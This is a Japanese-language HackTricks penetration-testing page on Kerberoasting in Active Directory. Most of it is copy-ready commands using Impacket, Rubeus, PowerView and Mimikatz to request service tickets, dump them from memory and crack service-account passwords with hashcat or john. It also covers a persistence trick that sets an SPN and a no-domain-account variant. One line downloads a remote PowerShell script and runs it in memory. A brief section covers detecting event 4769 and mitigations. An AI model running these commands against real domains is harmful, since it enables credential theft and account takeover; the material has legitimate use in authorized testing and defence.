# Kerberoast（Kerberoasting）

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか**？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには**、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>

## Kerberoast（Kerberoasting）

**Kerberoasting（Kerberoast）**の目的は、AD内でユーザーアカウントの代わりに実行されるサービスのための**TGSチケットを収集**することです。したがって、これらのTGSチケットの一部は、ユーザーパスワードから派生したキーで**暗号化**されています。その結果、これらの資格情報はオフラインで**クラック**される可能性があります。\
ユーザーアカウントがサービスとして使用されていることを知ることができるのは、プロパティ**"ServicePrincipalName"**が**nullでない**場合です。

したがって、Kerberoastingを実行するには、特権は必要ありませんので、TGSを要求できるドメインアカウントのみが必要です。

**有効なドメイン内の資格情報が必要です。**

### **攻撃**

{% hint style="warning" %}
**Kerberoastingツール**は、攻撃を実行し、TGS-REQリクエストを開始する際に、通常**`RC4暗号化`**を要求します。これは、**RC4が**[**弱い**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)ためであり、Hashcatなどのツールを使用して他の暗号化アルゴリズム（AES-128やAES-256など）よりもオフラインで簡単にクラックできるからです。\
RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
複数の機能を備えたツールには、kerberoastableユーザーのダンプが含まれています。
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoast可能なユーザーの列挙**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **テクニック1: TGSを要求し、メモリからダンプする**

このテクニックでは、攻撃者はKerberos認証プロトコルを悪用して、ターゲットのActive Directory（AD）環境からTGS（Ticket Granting Service）を取得し、メモリからダンプします。

攻撃者はまず、有効なユーザーアカウントを特定します。次に、攻撃者はこのアカウントを使用して、ターゲットのサービスアカウントに対してTGSを要求します。TGSは、サービスアカウントが特定のサービスにアクセスするために必要なチケットです。

攻撃者は、要求したTGSをメモリからダンプすることで、その中に含まれるサービスアカウントのハッシュを取得します。このハッシュは、攻撃者がオフラインで解析することができるため、攻撃者はサービスアカウントのパスワードを特定することができます。

このテクニックは、攻撃者が有効なユーザーアカウントを取得し、その権限を悪用することができるため、重大なセキュリティリスクとなります。したがって、Active Directory環境のセキュリティを強化するためには、適切な対策が必要です。
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **テクニック2: 自動ツール**

自動ツールを使用することも、Kerberoasting攻撃を実行するための効果的な方法です。これらのツールは、攻撃者が手動で行う必要がある多くの手順を自動化し、攻撃の効率を向上させます。

以下は、いくつかの一般的な自動ツールの例です。

- Rubeus: Rubeusは、Kerberosチケットの取得とKerberoasting攻撃を自動化するための強力なツールです。このツールは、Active Directory環境で使用されるKerberosチケットを取得し、攻撃者が攻撃対象のサービスアカウントのTGSチケットを抽出するのに役立ちます。

- Kekeo: Kekeoは、Kerberos認証プロトコルを操作するための強力なツールです。このツールは、攻撃者がKerberosチケットを取得し、Kerberoasting攻撃を実行するのに役立ちます。

これらのツールは、攻撃者がKerberoasting攻撃を簡単かつ迅速に実行できるようにするため、非常に便利です。ただし、これらのツールを使用する前に、適切な許可を取得し、法的な制約を遵守することが重要です。
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGSが要求されると、Windowsイベント`4769 - Kerberosサービスチケットが要求されました`が生成されます。
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### クラッキング
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 持続性

ユーザーに対して**十分な権限**がある場合、それを**kerberoastable**にすることができます。
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
以下は、**kerberoast** 攻撃に役立つ**ツール**があります: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Linuxで次の**エラー**が表示される場合: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** それはローカルの時刻のずれによるものです。ホストとDCの同期が必要です。いくつかのオプションがあります:

* `ntpdate <DCのIP>` - Ubuntu 16.04以降では非推奨
* `rdate -n <DCのIP>`

### 緩和策

Kerberoastは、攻撃可能な場合に非常にステルスです。

* セキュリティイベントID 4769 - Kerberosチケットが要求されました
* 4769は非常に頻繁なので、結果をフィルタリングしましょう:
* サービス名はkrbtgtではないこと
* サービス名は$で終わらないこと（サービス用のマシンアカウントをフィルタリングするため）
* アカウント名はmachine@domainではないこと（マシンからの要求をフィルタリングするため）
* 失敗コードは '0x0' であること（失敗をフィルタリングするため、0x0は成功）
* 最も重要なのは、チケットの暗号化タイプが0x17であることです
* 緩和策:
* サービスアカウントのパスワードは推測しにくいものにする（25文字以上）
* 管理されたサービスアカウントを使用する（定期的なパスワードの自動変更とSPNの委任管理）
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## ドメインアカウントなしでのKerberoast

2022年9月、[Charlie Clark](https://exploit.ph/)によって脆弱性が発見されました。ST（Service Tickets）は、Active Directoryアカウントを制御する必要なく、KRB_AS_REQリクエストを介して取得することができます。プリ認証なしで認証できる主体（AS-REP Roasting攻撃のような攻撃）がある場合、リクエストのreq-body部分のsname属性を変更することで、**暗号化されたTGT**の代わりに**ST**を要求するようリクエストを操作することが可能です。

この技術については、以下の記事で詳しく説明されています：[Semperisのブログ記事](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

{% hint style="warning" %}
この技術を使用するには、有効なアカウントをクエリするためのLDAPのリストを提供する必要があります。
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus の PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**[こちら](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**と**[こちら](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**で、ired.teamのKerberoastingに関する詳細情報を見ることができます。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出**してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**することができます。
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
